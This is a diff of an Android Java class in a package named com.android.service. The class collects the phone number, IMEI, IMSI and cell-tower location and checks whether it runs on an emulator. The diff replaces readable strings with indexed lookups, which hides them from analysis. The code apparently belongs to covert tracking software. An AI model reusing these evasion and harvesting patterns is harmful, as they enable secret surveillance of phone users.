@@ -22,7 +22,7 @@ import com.android.service.util.Utils;
  * The Class Device.
  */
 public class Device {
-	private static final String TAG = "Device";
+	private static final String TAG = "Device"; //$NON-NLS-1$
 
 	/** The singleton. */
 	private volatile static Device singleton;
@@ -57,7 +57,7 @@ public class Device {
 		String number = mTelephonyMgr.getLine1Number();
 
 		if (number == null || number.length() == 0) {
-			number = "Unknown";
+			number = "Unknown"; //$NON-NLS-1$
 		}
 
 		return number;
@@ -71,13 +71,13 @@ public class Device {
 	public byte[] getVersion() {
 		final byte[] versionRet = Utils.intToByteArray(Version.VERSION);
 		if (Cfg.DEBUG) {
-			Check.ensures(versionRet.length == 4, "Wrong version len");
+			Check.ensures(versionRet.length == 4, "Wrong version len"); //$NON-NLS-1$
 		}
 		return versionRet;
 	}
 
 	/**
-	 * Checks if is CDMA.
+	 * Check. if is CDMA. //$NON-NLS-1$
 	 * 
 	 * @return true, if is CDMA
 	 */
@@ -91,7 +91,7 @@ public class Device {
 
 	public boolean isSimulator() {
 		// return getDeviceId() == "9774d56d682e549c";
-		return android.os.Build.MODEL.endsWith("sdk");
+		return android.os.Build.MODEL.endsWith(Messages.getString("31.0")); //$NON-NLS-1$
 	}
 
 	/**
@@ -108,7 +108,7 @@ public class Device {
 		if (imei == null || imei.length() == 0) {
 			imei = Secure.getString(Status.getAppContext().getContentResolver(), Secure.ANDROID_ID);
 			if (imei == null || imei.length() == 0) {
-				imei = "N/A";
+				imei = Messages.getString("31.4"); //$NON-NLS-1$
 			}
 		}
 
@@ -127,7 +127,7 @@ public class Device {
 		String imsi = telephonyManager.getSubscriberId();
 
 		if (imsi == null) {
-			imsi = "UNAVAILABLE";
+			imsi = Messages.getString("31.1"); //$NON-NLS-1$
 		}
 
 		return imsi;
@@ -145,7 +145,7 @@ public class Device {
 
 		if (bcell == null) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: " + "null cell");
+				Check.log(TAG + Messages.getString("31.6") + Messages.getString("31.7")); //$NON-NLS-1$ //$NON-NLS-2$
 			}
 			return info;
 		}
@@ -154,21 +154,21 @@ public class Device {
 
 		if (bcell instanceof GsmCellLocation) {
 			if (Cfg.DEBUG) {
-				Check.asserts(Device.isGprs(), "gprs or not?");
+				Check.asserts(Device.isGprs(), Messages.getString("31.8")); //$NON-NLS-1$
 			}
 			final GsmCellLocation cell = (GsmCellLocation) bcell;
 
 			info.setGsm(conf.mcc, conf.mnc, cell.getLac(), cell.getCid(), rssi);
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " info: " + info.toString());
+				Check.log(TAG + Messages.getString("31.9") + info.toString()); //$NON-NLS-1$
 			}
 
 		}
 
 		if (bcell instanceof CdmaCellLocation) {
 			if (Cfg.DEBUG) {
-				Check.asserts(Device.isCdma(), "cdma or not?");
+				Check.asserts(Device.isCdma(), Messages.getString("31.10")); //$NON-NLS-1$
 			}
 			final CdmaCellLocation cell = (CdmaCellLocation) tm.getCellLocation();
 
@@ -181,7 +181,7 @@ public class Device {
 			info.bid = cell.getBaseStationId();
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " info: " + info.toString());
+				Check.log(TAG + Messages.getString("31.11") + info.toString()); //$NON-NLS-1$
 			}
 
 		}
